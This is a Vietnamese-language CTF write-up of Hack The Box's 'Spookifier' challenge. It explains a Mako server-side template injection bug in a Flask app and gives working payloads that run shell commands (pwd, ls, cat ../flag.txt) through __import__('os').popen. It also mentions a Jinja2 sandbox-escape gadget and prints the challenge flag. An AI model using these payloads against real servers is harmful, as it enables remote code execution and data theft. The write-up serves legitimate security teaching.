# Spookifier — CTF Writeup (Hack The Box)

---

## Tổng quan

**Spookifier** là một ứng dụng web đơn giản: người dùng nhập tên, ứng dụng hiển thị tên đó dưới 4 kiểu font "ma quái" khác nhau. Bên dưới lớp giao diện vui mắt này là một lỗ hổng **Server-Side Template Injection (SSTI)** nghiêm trọng trong cách ứng dụng dựng (render) template bằng **Mako** — một template engine cho phép thực thi trực tiếp code Python, nguy hiểm hơn đáng kể so với Jinja2 mặc định của Flask.

---

## Phân tích mã nguồn

### `routes.py` — Nhận input từ người dùng

```python
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html', output=converted)
    
    return render_template('index.html', output='')
```

Quan sát quan trọng:

- Tham số `text` lấy trực tiếp từ **query string** (`GET /?text=...`).
- Không có bất kỳ bước **sanitization** hay validation nào trước khi truyền vào `spookify()`.
- Kết quả trả về được nhúng thẳng vào template `index.html`.

### `util.py` — Nơi lỗ hổng thực sự nằm

```python
def generate_render(converted_fonts):
    result = '''
        <tr><td>{0}</td></tr>
        <tr><td>{1}</td></tr>
        <tr><td>{2}</td></tr>
        <tr><td>{3}</td></tr>
    '''.format(*converted_fonts)
    
    return Template(result).render()  # ⚠️ DÒNG NGUY HIỂM

def change_font(text_list):
    text_list = [*text_list]
    current_font = []
    all_fonts = []
    
    add_font_to_list = lambda text, font_type: (
        [current_font.append(globals()[font_type].get(i, ' ')) for i in text],
        all_fonts.append(''.join(current_font)),
        current_font.clear()
    ) and None
    
    add_font_to_list(text_list, 'font1')
    add_font_to_list(text_list, 'font2')
    add_font_to_list(text_list, 'font3')
    add_font_to_list(text_list, 'font4')
    
    return all_fonts

def spookify(text):
    converted_fonts = change_font(text_list=text)
    return generate_render(converted_fonts=converted_fonts)
```

Điểm chí mạng: `change_font()` chỉ chuyển đổi từng **ký tự có trong bảng font** (`font1`–`font4`), những ký tự đặc biệt như `$`, `{`, `}` không nằm trong bảng này nên được giữ nguyên (fallback `' '` chỉ áp dụng khi ký tự không tồn tại trong dict — nhưng cấu trúc payload Mako vẫn lọt qua nguyên vẹn ở phần literal). Kết quả: chuỗi input chứa cú pháp Mako (`${ ... }`) được nhúng thẳng vào `result`, rồi `Template(result).render()` **thực thi nó như một template động** — không phải như dữ liệu tĩnh.

### `index.html` — Hiển thị output

```html
<table class="table table-bordered">
    <tbody>
        ${output}
    </tbody>
</table>
```

Biến `output` (đã được Mako render từ bước trước) tiếp tục được chèn vào template chính bằng cú pháp `${...}` — hợp lý với luồng dữ liệu nhưng không cứu được vì lỗ hổng đã xảy ra trước đó, ngay tại `generate_render()`.

---

## Phân tích lỗ hổng

### Lỗ hổng — Server-Side Template Injection (SSTI)

**Nguyên nhân gốc rễ:** input người dùng được dùng để **xây dựng** một chuỗi template, sau đó chuỗi đó lại được **render** bằng chính engine đó:

```python
result = '''<tr><td>{0}</td></tr>...'''.format(*converted_fonts)  # converted_fonts chứa input user
return Template(result).render()  # SSTI
```

Khác với Jinja2 (`{{ 7*7 }}` → `49`), Mako sử dụng cú pháp `${ ... }` và hỗ trợ thêm `%` directives cùng block `<% %>` cho phép viết code Python tùy ý — không chỉ biểu thức đơn giản.

### Execution context nguy hiểm của Mako

Mako mặc định cấp cho mọi template quyền truy cập:

```python
__builtins__    # Python builtins
__import__      # Hàm import module
locals()        # Local variables
globals()       # Global variables
context         # Mako Context object
```

Điều này nghĩa là attacker có thể **import module bất kỳ** (`os`, `subprocess`, `sys`...), từ đó thực thi system command, đọc/ghi file, hoặc truy cập biến môi trường — không có sandbox nào chặn lại theo mặc định.

---

## Chain attack chi tiết

### Bước 1 — Xác nhận SSTI

```
http://TARGET/?text=${ 7*7 }
```

<img width="1633" height="809" alt="image" src="https://github.com/user-attachments/assets/e2d03595-3493-43ca-948e-d45316f26a04" />


### Bước 2 — Xác định working directory

```
http://TARGET/?text=${ __import__('os').popen('pwd').read() }
```

Response: `/app`
<img width="1623" height="768" alt="image" src="https://github.com/user-attachments/assets/3139d627-a941-4a85-aa4f-94d53c056b6c" />


`__import__('os')` import module `os`, `popen('pwd')` thực thi lệnh `pwd`, `.read()` đọc kết quả trả về.

### Bước 3 — Liệt kê thư mục hiện tại

```
${ __import__('os').popen('ls -la').read() }
```

<img width="1636" height="827" alt="image" src="https://github.com/user-attachments/assets/bac3a880-4703-4bec-947c-1ab5a8f8b527" />


Không thấy `flag.txt` trực tiếp trong `/app` — cần kiểm tra thư mục cha.

### Bước 4 — Đọc flag

```
${ __import__('os').popen('cat ../flag.txt').read() }
```
<img width="1489" height="816" alt="image" src="https://github.com/user-attachments/assets/0ae10cb4-64ea-4317-9351-95e4dcdd22fb" />


**Flag:**
```
HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
```

---

## Root Cause Analysis

| # | Nguyên nhân | File | Hậu quả |
|---|-------------|------|---------|
| 1 | Không sanitize input từ user | `routes.py` | Input có thể chứa cú pháp template độc hại |
| 2 | `Template(result).render()` chạy trên chuỗi chứa input user | `util.py` | Mako thực thi code Python trong template |
| 3 | Font transformation không loại bỏ ký tự đặc biệt (`$`, `{`, `}`) | `util.py` | Cú pháp Mako đi nguyên vẹn vào template |
| 4 | Không bật sandbox mode cho Mako | `main.py` | Template có quyền truy cập toàn bộ Python builtins/modules |

---

## So sánh với các template engine khác

| Engine | Cú pháp cơ bản | Mức độ rủi ro |
|--------|-----------------|----------------|
| **Jinja2** (Flask default) | `{{ 7*7 }}` → `49` | Có sandbox cơ bản, nhưng vẫn bypass được qua `''.__class__.__mro__[1].__subclasses__()` |
| **Mako** | `${ 7*7 }` → `49`, hỗ trợ thêm `<% %>` block | **Không sandbox mặc định**, cho phép thực thi code Python trực tiếp |
| **Thymeleaf** (Java) | `${7*7}` → `49` | Cần cú pháp đặc biệt như `${T(java.lang.Runtime)...}` |
| **EJS** (JavaScript) | `<%= 7*7 %>` → `49` | Rủi ro phụ thuộc cấu hình, file inclusion qua `<%- include() %>` |

Mako vốn được thiết kế hướng tới hiệu năng và linh hoạt hơn là an toàn theo mặc định — đây là lý do nó đặc biệt nguy hiểm khi dùng để render dữ liệu không tin cậy.

---

## Flag

```
HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
```
